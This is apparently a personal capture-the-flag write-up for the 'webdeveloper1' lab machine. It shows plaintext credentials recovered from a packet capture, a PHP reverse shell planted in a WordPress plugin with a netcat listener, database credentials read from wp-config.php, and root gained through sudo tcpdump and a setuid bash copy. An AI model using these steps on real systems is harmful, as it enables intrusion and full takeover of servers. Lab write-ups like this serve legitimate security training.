<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>webdeveloper1</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>webdeveloper1</h1><br/><p>made a dirb scan and found the &quot;ipdata&quot; file .cap file , when we look closely , we find that the .cap file has the login credentials in the wp-login request on 180th number from the filter : http</p><p></p><p>also when we look at the username password we found the username was: webdeveloper and passwd:Te5eQg&amp;4sBS!Yr$)wf%(DcAd</p><p>one way to get inside the server is to get the reverse shell via the php files in the wp-plugins</p><p>then change the php file in the index.php and replace the file contents with: reverse_shell.php</p><p>remember to change the ip in the beginning and the shell from sh to bash</p><p>then run the command in the linux: nc -nlvp 1234</p><p>then go to the following link:</p><p><a href="http://10.38.1.110/wp-content/plugins/akismet/index.php">http://10.38.1.110/wp-content/plugins/akismet/index.php</a></p><p>you get the reverse shell</p><p></p><p>then.....</p><p></p><p>we go to the shell and then we go finding the directories manually ... look for some juicy content , we get to know that the file called wp-config.php file is responsible for the configuration of db, we&#39;ll start from there:</p><p></p><p>and ...</p><p></p><p>BOOM shakalaka!:</p><p>                // ** MySQL settings - You can get this info from your web host ** //</p><p>                /** The name of the database for WordPress */</p><p>                define(&#39;DB_NAME&#39;, &#39;wordpress&#39;);</p><p></p><p>                /** MySQL database username */</p><p>                define(&#39;DB_USER&#39;, &#39;webdeveloper&#39;);</p><p></p><p>                /** MySQL database password */</p><p>                define(&#39;DB_PASSWORD&#39;, &#39;MasterOfTheUniverse&#39;);</p><p></p><p>                /** MySQL hostname */</p><p>                define(&#39;DB_HOST&#39;, &#39;localhost&#39;);</p><p></p><p>                /** Database Charset to use in creating database tables. */</p><p>                define(&#39;DB_CHARSET&#39;, &#39;utf8mb4&#39;);</p><p></p><p>                /** The Database Collate type. Don&#39;t change this if in doubt. */</p><p>                define(&#39;DB_COLLATE&#39;, &#39;&#39;);</p><p></p><p>homerun in first strike , got this from the filr , so always remember to check these files whenever you get the web-account access:</p><p>/var/www/html/&lt;files and folders especially config ones&gt;</p><p></p><p>when we run the sudo -l command we find that we can run the command: tcpdump command and via this link:</p><p><a href="https://gtfobins.github.io/gtfobins/tcpdump/">https://gtfobins.github.io/gtfobins/tcpdump/</a></p><p>we get to know that there are some way we can run escalated privelage&#39;s command in the linux from this command</p><p></p><p>                                    </p><p>                                    COMMAND=&#39;&lt;here you command&gt;&#39;</p><p>                                    TF=$(mktemp)</p><p>                                    echo &quot;$COMMAND&quot; &gt; $TF</p><p>                                    chmod +x $TF</p><p>                                    sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root</p><p></p><p>this was the sample , but we need root access , you can see we don&#39;t have root group neither the gid and all so what we do is modify this above set of commands a bit:</p><p>we create a new file in tmp and then:....                                    </p><p>    $ cd /tmp</p><p></p><p>    $ touch bash</p><p></p><p>    $ vim bash</p><p></p><p>copy the given commands in it: {why? :  }</p><p>    cp /bin/bash /tmp/sh-1</p><p>    chmod u+s /tmp/sh-1</p><p></p><p>    $ chmod +x bash</p><p></p><p>    $ sudo /usr/sbin/tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/bash -Z root</p><p>    </p><p>    then do ./sh-1</p><p>    theh ./sh-1 -p</p><p>    and you are root</p><p>    </p><p>    go to root dir:</p><p>    and get this flag:</p><p>    Congratulations here is youre flag:</p><p>cba045a5a4f26f1cd8d7be9a5c2b1b34f6c5d290</p></div>
</body>
</html>
